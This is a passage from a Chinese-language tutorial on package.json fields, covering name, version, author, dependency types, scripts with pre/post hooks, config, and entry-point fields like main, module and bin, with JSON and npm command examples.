class="string">&quot;test&quot;</span>: <span class="string">&quot;react-scripts test&quot;</span>,</span><br><span class="line">      <span class="string">&quot;eject&quot;</span>: <span class="string">&quot;react-scripts eject&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;eslintConfig&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;extends&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;react-app&quot;</span>,</span><br><span class="line">      <span class="string">&quot;react-app/jest&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;browserslist&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;production&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;&gt;0.2%&quot;</span>,</span><br><span class="line">      <span class="string">&quot;not dead&quot;</span>,</span><br><span class="line">      <span class="string">&quot;not op_mini all&quot;</span></span><br><span class="line">    ],</span><br><span class="line">      <span class="string">&quot;development&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;last 1 chrome version&quot;</span>,</span><br><span class="line">      <span class="string">&quot;last 1 firefox version&quot;</span>,</span><br><span class="line">      <span class="string">&quot;last 1 safari version&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1635264820723-512b345c-9715-4891-a57a-890e588998f2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1635264820723-512b345c-9715-4891-a57a-890e588998f2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="iOBXA"></a></p><h2 id="一、必须属性"><a href="#一、必须属性" class="headerlink" title="一、必须属性"></a>一、必须属性</h2><p>package.json 中最重要的两个字段就是<code>name</code>和<code>version</code>，它们都是必须的，如果没有，就无法正常执行 npm install 命令。npm 规定 package.json 文件是由名称和版本号作为唯一标识符的。</p><p><a name="uUXX6"></a></p><h3 id="1-name"><a href="#1-name" class="headerlink" title="1. name"></a>1. name</h3><p><code>name</code>很容易理解，就是项目的名称，它是一个字符串。在给 name 字段命名时，需要注意以下几点：<br />● 名称的长度必须小于或等于 214 个字符，不能以<code>“.”</code>和<code>“_”</code>开头，不能包含大写字母。（这是因为当软件包在 npm 上发布时，会基于此属性获得自己的 URL，所以不能包含非 URL 安全字符（non-url-safe））；<br />● 名称可以作为参数被传入<code>require(&quot;&quot;)</code>，用来导入模块，所以应当尽可能的简短、语义化；<br />● 名称不能和其他模块的名称重复，可以使用<code>npm view</code>命令查询模块明是否重复，如果重复就会提示 404：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1635175636076-33595e1a-d8d6-4aa8-ab2f-18f02b30ca4b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1635175636076-33595e1a-d8d6-4aa8-ab2f-18f02b30ca4b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>如果 npm 包上有对应的包，则会显示包的详细信息：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1635175578663-64bf5cb9-4d7c-4114-8d38-19af0f9d1cab.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1635175578663-64bf5cb9-4d7c-4114-8d38-19af0f9d1cab.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>实际上，我们平时开发的很多项目并不会发布在 npm 上，所以这个名称是否标准可能就不是那么重要，它不会影响项目的正常运行。如果需要发布在 npm 上，name 字段一定要符合要求。</p><p><a name="QyItB"></a></p><h3 id="2-version"><a href="#2-version" class="headerlink" title="2. version"></a>2. version</h3><p><code>version</code>字段表示该项目包的版本号，它是一个字符串。在每次项目改动后，即将发布时，都要同步的去更改项目的版本号。版本号的使用规范如下：</p><p>● 版本号的命名遵循语义化版本 2.0.0 规范，格式为：<strong>主版本号.次版本号.修订号</strong>，通常情况下，修改主版本号是做了大的功能性的改动，修改次版本号是新增了新功能，修改修订号就是修复了一些 bug；</p><p>● 如果某个版本的改动较大，并且不稳定，可能如法满足预期的兼容性需求，就需要发布先行版本，先行版本通过会加在版本号的后面，通过“-”号连接以点分隔的标识符和版本编译信息：内部版本（alpha）、公测版本（beta）和候选版本（rc，即 release candiate）。</p><p>可以通过以下命令来查看 npm 包的版本信息，以 react 为例：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查看最新版本</span></span><br><span class="line">npm view react version</span><br><span class="line"><span class="comment">// 查看所有版本</span></span><br><span class="line">npm view react version</span><br></pre></td></tr></table></figure><p><br />当执行第二条命令时，结果如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1635177200796-ffd50c7a-0e95-4099-aa57-fa4b1bab7984.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1635177200796-ffd50c7a-0e95-4099-aa57-fa4b1bab7984.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="ErUwX"></a></p><h2 id="二、描述信息"><a href="#二、描述信息" class="headerlink" title="二、描述信息"></a>二、描述信息</h2><p>package.jaon 中有五个和项目包描述信息相关的配置字段，下面就分别来看看这些字段的含义。</p><p><a name="BN4bP"></a></p><h3 id="1-description"><a href="#1-description" class="headerlink" title="1. description"></a>1. description</h3><p><code>description</code>字段用来描述这个项目包，它是一个字符串，可以让其他开发者在 npm 的搜索中发现我们的项目包。</p><p><a name="NAh1A"></a></p><h3 id="2-keywords"><a href="#2-keywords" class="headerlink" title="2. keywords"></a>2. keywords</h3><p><code>keywords</code>字段是一个字符串数组，表示这个项目包的关键词。和 description 一样，都是用来增加项目包的曝光率的。下面是 eslint 包的描述和关键词：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1635181515396-fe760662-7ac8-4389-ba11-3784b572021a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1635181515396-fe760662-7ac8-4389-ba11-3784b572021a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="SlTxk"></a></p><h3 id="3-author"><a href="#3-author" class="headerlink" title="3. author"></a>3. author</h3><p><code>author</code>顾名思义就是作者，表示该项目包的作者。它有两种形式，一种是字符串格式：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;author&quot;</span>: <span class="string">&quot;CUGGZ &lt;xxxxx@xx.com&gt; (https://juejin.cn/user/3544481220801815)&quot;</span></span><br></pre></td></tr></table></figure><p>另一种是对象形式：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;author&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span> : <span class="string">&quot;CUGGZ&quot;</span>,</span><br><span class="line">  <span class="string">&quot;email&quot;</span> : <span class="string">&quot;xxxxx@xx.com&quot;</span>,</span><br><span class="line">  <span class="string">&quot;url&quot;</span> : <span class="string">&quot;https://juejin.cn/user/3544481220801815&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="eB9wh"></a></p><h3 id="4-contributors"><a href="#4-contributors" class="headerlink" title="4. contributors"></a>4. contributors</h3><p><code>contributors</code>表示该项目包的贡献者，和 author 不同的是，该字段是一个数组，包含所有的贡献者，它同样有两种写法：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;contributors&quot;</span>: [</span><br><span class="line">  <span class="string">&quot;CUGGZ0 &lt;xxxxx@xx.com&gt; (https://juejin.cn/user/3544481220801815)&quot;</span>,</span><br><span class="line">  <span class="string">&quot;CUGGZ1 &lt;xxxxx@xx.com&gt; (https://juejin.cn/user/3544481220801815)&quot;</span></span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;contributors&quot;</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span> : <span class="string">&quot;CUGGZ0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;email&quot;</span> : <span class="string">&quot;xxxxx@xx.com&quot;</span>,</span><br><span class="line">  <span class="string">&quot;url&quot;</span> : <span class="string">&quot;https://juejin.cn/user/3544481220801815&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span> : <span class="string">&quot;CUGGZ1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;email&quot;</span> : <span class="string">&quot;xxxxx@xx.com&quot;</span>,</span><br><span class="line">  <span class="string">&quot;url&quot;</span> : <span class="string">&quot;https://juejin.cn/user/3544481220801815&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><p><a name="GB6U6"></a></p><h3 id="5-homepage"><a href="#5-homepage" class="headerlink" title="5. homepage"></a>5. homepage</h3><p><code>homepage</code>就是项目的主页地址了，它是一个字符串。</p><p><a name="kUGUj"></a></p><h3 id="6-repository"><a href="#6-repository" class="headerlink" title="6. repository"></a>6. repository</h3><p><code>repository</code>表示代码的存放仓库地址，通常有两种书写形式。第一种是字符串形式：<br />除此之外，还可以显式地设置版本控制系统，这时就是对象的形式：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;repository&quot;</span>: <span class="string">&quot;https://github.com/facebook/react.git&quot;</span></span><br></pre></td></tr></table></figure><p><a name="hTJOL"></a></p><h3 id="7-bugs"><a href="#7-bugs" class="headerlink" title="7. bugs"></a>7. bugs</h3><p><code>bugs</code>表示项目提交问题的地址，该字段是一个对象，可以添加一个提交问题的地址和反馈的邮箱：<br />最常见的 bugs 就是 Github 中的 issues 页面，如上就是 react 的 issues 页面地址。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;bugs&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;url&quot;</span> : <span class="string">&quot;https://github.com/facebook/react/issues&quot;</span>,</span><br><span class="line">  <span class="string">&quot;email&quot;</span> : <span class="string">&quot;xxxxx@xx.com&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br /><a name="Wyqqm"></a>## 三、依赖配置<p>通常情况下，我们的项目会依赖一个或者多个外部的依赖包，根据依赖包的不同用途，可以将他们配置在下面的五个属性下：<code>dependencies</code>、<code>devDependencies</code>、<code>peerDependencies</code>、<code>bundledDependencies</code>、<code>optionalDependencies</code> 。下面就来看看每个属性的含义。</p><p><a name="KOQYi"></a></p><h3 id="1-dependencies"><a href="#1-dependencies" class="headerlink" title="1. dependencies"></a>1. dependencies</h3><p><code>dependencies</code>字段中声明的是项目的生产环境中所必须的依赖包。当使用 npm 或 yarn 安装 npm 包时，该 npm 包会被自动插入到此配置项中：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install &lt;<span class="variable constant_">PACKAGENAME</span>&gt;</span><br><span class="line">yarn add &lt;<span class="variable constant_">PACKAGENAME</span>&gt;</span><br></pre></td></tr></table></figure><p><br />当在安装依赖时使用<code>--save</code>参数，也会将新安装的 npm 包写入 dependencies 属性。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save &lt;<span class="variable constant_">PACKAGENAME</span>&gt;</span><br></pre></td></tr></table></figure><p><br />该字段的值是一个对象，该对象的各个成员，分别由模块名和对应的版本要求组成，表示依赖的模块及其版本范围。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">   <span class="string">&quot;react&quot;</span>: <span class="string">&quot;^17.0.2&quot;</span>,</span><br><span class="line">   <span class="string">&quot;react-dom&quot;</span>: <span class="string">&quot;^17.0.2&quot;</span>,</span><br><span class="line">   <span class="string">&quot;react-scripts&quot;</span>: <span class="string">&quot;4.0.3&quot;</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><br />这里每一项配置都是一个键值对（key-value）， key 表示模块名称，value 表示模块的版本号。版本号遵循<strong>主版本号.次版本号.修订号</strong>的格式规定：<br />● <strong>固定版本：</strong>上面的 react-scripts 的版本 4.0.3 就是固定版本，安装时只安装这个指定的版本；<br />● <strong>波浪号：</strong>比如~4.0.3，表示安装 4.0.x 的最新版本（不低于 4.0.3），也就是说安装时不会改变主版本号和<strong>次</strong>版本号；<br />● <strong>插入号：</strong>比如上面 react 的版本^17.0.2，表示安装 17.x.x 的最新版本（不低于 17.0.2），也就是说安装时不会改变主版本号。如果主版本号为 0，那么插入号和波浪号的行为是一致的；<br />● <strong>latest</strong>：安装最新的版本。</p><p>需要注意，不要把测试或者过渡性的依赖放在 dependencies，避免生产环境出现意外的问题。</p><p><a name="vrjhI"></a></p><h3 id="2-devDependencies"><a href="#2-devDependencies" class="headerlink" title="2. devDependencies"></a>2. devDependencies</h3><p><code>devDependencies</code>中声明的是开发阶段需要的依赖包，如 Webpack、Eslint、Babel 等，用于辅助开发。它们不同于 dependencies，因为它们只需安装在开发设备上，而无需在生产环境中运行代码。当打包上线时并不需要这些包，所以可以把这些依赖添加到 devDependencies 中，这些依赖依然会在本地指定 npm install 时被安装和管理，但是不会被安装到生产环境中。</p><p>当使用 npm 或 yarn 安装软件包时，指定以下参数后，新安装的 npm 包会被自动插入到此列表中：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev &lt;<span class="variable constant_">PACKAGENAME</span>&gt;</span><br><span class="line">yarn add --dev &lt;<span class="variable constant_">PACKAGENAME</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;devDependencies&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;autoprefixer&quot;</span>: <span class="string">&quot;^7.1.2&quot;</span>,</span><br><span class="line">  <span class="string">&quot;babel-core&quot;</span>: <span class="string">&quot;^6.22.1&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="FhQeY"></a></p><h3 id="3-peerDependencies"><a href="#3-peerDependencies" class="headerlink" title="3. peerDependencies"></a>3. peerDependencies</h3><p>有些情况下，我们的项目和所依赖的模块，都会同时依赖另一个模块，但是所依赖的版本不一样。比如，我们的项目依赖 A 模块和 B 模块的 1.0 版，而 A 模块本身又依赖 B 模块的 2.0 版。大多数情况下，这不是问题，B 模块的两个版本可以并存，同时运行。但是，有一种情况，会出现问题，就是这种依赖关系将暴露给用户。</p><p>最典型的场景就是插件，比如 A 模块是 B 模块的插件。用户安装的 B 模块是 1.0 版本，但是 A 插件只能和 2.0 版本的 B 模块一起使用。这时，用户要是将 1.0 版本的 B 的实例传给 A，就会出现问题。因此，需要一种机制，在模板安装的时候提醒用户，如果 A 和 B 一起安装，那么 B 必须是 2.0 模块。</p><p><code>peerDependencies</code>字段就是用来供插件指定其所需要的主工具的版本。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;name&quot;</span>: <span class="string">&quot;chai-as-promised&quot;</span>,</span><br><span class="line"><span class="string">&quot;peerDependencies&quot;</span>: &#123;</span><br><span class="line">   <span class="string">&quot;chai&quot;</span>: <span class="string">&quot;1.x&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />上面代码指定在安装 chai-as-promised 模块时，主程序 chai 必须一起安装，而且 chai 的版本必须是 1.x。如果项目指定的依赖是 chai 的 2.0 版本，就会报错。</p><p>需要注意，从<code>npm 3.0</code>版开始，<code>peerDependencies</code>不再会默认安装了。</p><p><a name="HnaWk"></a></p><h3 id="4-optionalDependencies"><a href="#4-optionalDependencies" class="headerlink" title="4. optionalDependencies"></a>4. optionalDependencies</h3><p>如果需要在找不到包或者安装包失败时，npm 仍然能够继续运行，则可以将该包放在<code>optionalDependencies</code>对象中，<code>optionalDependencies</code>对象中的包会覆盖<code>dependencies</code>中同名的包，所以只需在一个地方进行设置即可。</p><p>需要注意，由于<code>optionalDependencies</code>中的依赖可能并为安装成功，所以一定要做异常处理，否则当获取这个依赖时，如果获取不到就会报错。</p><p><a name="m5rid"></a></p><h3 id="5-bundledDependencies"><a href="#5-bundledDependencies" class="headerlink" title="5. bundledDependencies"></a>5. bundledDependencies</h3><p>上面的几个依赖相关的配置项都是一个对象，而<code>bundledDependencies</code>配置项是一个数组，数组里可以指定一些模块，这些模块将在这个包发布时被一起打包。</p><p>需要注意，这个字段数组中的值必须是在<code>dependencies</code>, <code>devDependencies</code>两个里面声明过的包才行。</p><p><a name="BQhfQ"></a></p><h3 id="6-engines"><a href="#6-engines" class="headerlink" title="6. engines"></a>6. engines</h3><p>当我们维护一些旧项目时，可能对 npm 包的版本或者 Node 版本有特殊要求，如果不满足条件就可能无法将项目跑起来。为了让项目开箱即用，可以在 engines 字段中说明具体的版本号：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;engines&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;node&quot;</span>: <span class="string">&quot;&gt;=8.10.3 &lt;12.13.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;npm&quot;</span>: <span class="string">&quot;&gt;=6.9.0&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />需要注意，<code>engines</code>只是起一个说明的作用，即使用户安装的版本不符合要求，也不影响依赖包的安装。</p><p><a name="bKPyg"></a></p><h2 id="四、脚本配置"><a href="#四、脚本配置" class="headerlink" title="四、脚本配置"></a>四、脚本配置</h2><br /><a name="I0LsP"></a>### 1. scripts`scripts` 是 `package.json`中内置的脚本入口，是key-value键值对配置，key为可运行的命令，可以通过 npm run 来执行命令。除了运行基本的scripts命令，还可以结合`pre`和`post`完成前置和后续操作。先来看一组scripts：<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;dev&quot;</span>: <span class="string">&quot;node index.js&quot;</span>,</span><br><span class="line">  <span class="string">&quot;predev&quot;</span>: <span class="string">&quot;node beforeIndex.js&quot;</span>,</span><br><span class="line">  <span class="string">&quot;postdev&quot;</span>: <span class="string">&quot;node afterIndex.js&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br />这三个js文件中都有一句console：<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;scripts: index.js&quot;</span>)</span><br><span class="line"><span class="comment">// beforeIndex.js</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;scripts: before index.js&quot;</span>)</span><br><span class="line"><span class="comment">// afterIndex.js</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;scripts: after index.js&quot;</span>)</span><br></pre></td></tr></table></figure><br />当我们执行npm run dev命令时，输出结果如下：<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">scripts</span>: before index.<span class="property">js</span></span><br><span class="line"><span class="attr">scripts</span>: index.<span class="property">js</span></span><br><span class="line"><span class="attr">scripts</span>: after index.<span class="property">js</span></span><br></pre></td></tr></table></figure><br />可以看到，三个命令都执行了，执行顺序是`predev→dev→postdev`。如果scripts命令存在一定的先后关系，则可以使用这三个配置项，分别配置执行命令。<p>通过配置 scripts 属性，可以定义一些常见的操作命令：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;dev&quot;</span>: <span class="string">&quot;webpack-dev-server --inline --progress --config build/webpack.dev.conf.js&quot;</span>,</span><br><span class="line">  <span class="string">&quot;start&quot;</span>: <span class="string">&quot;npm run dev&quot;</span>,</span><br><span class="line">  <span class="string">&quot;unit&quot;</span>: <span class="string">&quot;jest --config test/unit/jest.conf.js --coverage&quot;</span>,</span><br><span class="line">  <span class="string">&quot;test&quot;</span>: <span class="string">&quot;npm run unit&quot;</span>,</span><br><span class="line">  <span class="string">&quot;lint&quot;</span>: <span class="string">&quot;eslint --ext .js,.vue src test/unit&quot;</span>,</span><br><span class="line">  <span class="string">&quot;build&quot;</span>: <span class="string">&quot;node build/build.js&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这些脚本是命令行应用程序。可以通过调用 <code>npm run XXX</code> 或 <code>yarn XXX</code> 来运行它们，其中 XXX 是命令的名称。 例如：<code>npm run dev</code>。我们可以为命令使用任何的名称，脚本也可以是任何操作。</p><p>使用好该字段可以大大的提升开发效率。</p><p><a name="x4Bs2"></a></p><h3 id="2-config"><a href="#2-config" class="headerlink" title="2. config"></a>2. config</h3><p><code>config</code>字段用来配置 scripts 运行时的配置参数，如下所示：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;config&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;port&quot;</span>: <span class="number">3000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />如果运行<code>npm run start</code>，则<code>port</code>字段会映射到<code>npm_package_config_port</code>环境变量中：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(process.<span class="property">env</span>.<span class="property">npm_package_config_port</span>); <span class="comment">// 3000</span></span><br></pre></td></tr></table></figure><p><br />用户可以通过<code>npm config set foo:port 3001</code> 命令来重写<code>port</code>的值。</p><p><a name="V8LbR"></a></p><h2 id="五、文件-amp-目录"><a href="#五、文件-amp-目录" class="headerlink" title="五、文件&amp;目录"></a>五、文件&amp;目录</h2><p>下面来看看<code>package.json</code>中和文件以及目录相关的属性。</p><p><a name="kF4au"></a></p><h3 id="1-main"><a href="#1-main" class="headerlink" title="1. main"></a>1. main</h3><p><code>main</code> 字段用来指定加载的入口文件，在 browser 和 Node 环境中都可以使用。如果我们将项目发布为 npm 包，那么当使用 require 导入 npm 包时，返回的就是 main 字段所列出的文件的 module.exports 属性。如果不指定该字段，默认是项目根目录下的 index.js。如果没找到，就会报错。</p><p>该字段的值是一个字符串：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;main&quot;</span>: <span class="string">&quot;./src/index.js&quot;</span>,</span><br></pre></td></tr></table></figure><p><a name="TVWuS"></a></p><h3 id="2-browser"><a href="#2-browser" class="headerlink" title="2. browser"></a>2. browser</h3><p><code>browser</code>字段可以定义 npm 包在 browser 环境下的入口文件。如果 npm 包只在 web 端使用，并且严禁在 server 端使用，使用 browser 来定义入口文件。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;browser&quot;</span>: <span class="string">&quot;./src/index.js&quot;</span></span><br></pre></td></tr></table></figure><p><a name="xc9zp"></a></p><h3 id="3-module"><a href="#3-module" class="headerlink" title="3. module"></a>3. module</h3><p><code>module</code>字段可以定义 npm 包的 ESM 规范的入口文件，browser 环境和 node 环境均可使用。如果 npm 包导出的是 ESM 规范的包，使用 module 来定义入口文件。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;module&quot;</span>: <span class="string">&quot;./src/index.mjs&quot;</span>,</span><br></pre></td></tr></table></figure><p>需要注意，_.js 文件是使用 commonJS 规范的语法(require(‘xxx’))，_.mjs 是用 ESM 规范的语法(import ‘xxx’)。</p><p>上面三个的入口入口文件相关的配置是有差别的，特别是在不同的使用场景下。在 Web 环境中，如果使用<code>loader</code>加载 ESM（ES module），那么这三个配置的加载顺序是<code>browser→module→main</code>，如果使用<code>require</code>加载 CommonJS 模块，则加载的顺序为<code>main→module→browser</code>。</p><p><code>Webpack</code>在进行项目构建时，有一个<code>target</code>选项，默认为 Web，即构建 Web 应用。如果需要编译一些同构项目，如 node 项目，则只需将 webpack.config.js 的<code>target</code>选项设置为 node 进行构建即可。如果再 Node 环境中加载 CommonJS 模块，或者 ESM，则只有 main 字段有效。</p><p><a name="Vu6it"></a></p><h3 id="4-bin"><a href="#4-bin" class="headerlink" title="4. bin"></a>4. bin</h3><p><code>bin</code>字段用来指定各个内部命令对应的可执行文件的位置：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;bin&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;someTool&quot;</span>: <span class="string">&quot;./bin/someTool.js&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里，<code>someTool</code> 命令对应的可执行文件为 bin 目录下的 someTool.js，someTool.js 会建立符号链接 node_modules&#x2F;.bin&#x2F;someTool。由于 node_modules&#x2F;.bin&#x2F;目录会在运行时加入系统的 PATH 变量，因此在运行 npm 时，就可以不带路径，直接通过命令来调用这些脚本。因此，下面的写法可以简写：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">scripts</span>: &#123;</span><br><span class="line">  <span class="attr">start</span>: <span class="string">&quot;./node_modules/bin/someTool.js build&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简写</span></span><br><span class="line"><span class="attr">scripts</span>: &#123;</span><br><span class="line">  <span class="attr">start</span>: <span class="string">&quot;someTool build&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />所有 node_modules&#x2F;.bin&#x2F;目录下的命令，都可以用<code>npm run [命令]</code>的格式运行。</p><p>上面的配置在 package.json 包中国提供了一个映射到本地文件名的 bin 字段，之后 npm 包将链接这个文件到 prefix&#x2F;fix 里面，以便全局引入。或者链接到本地的 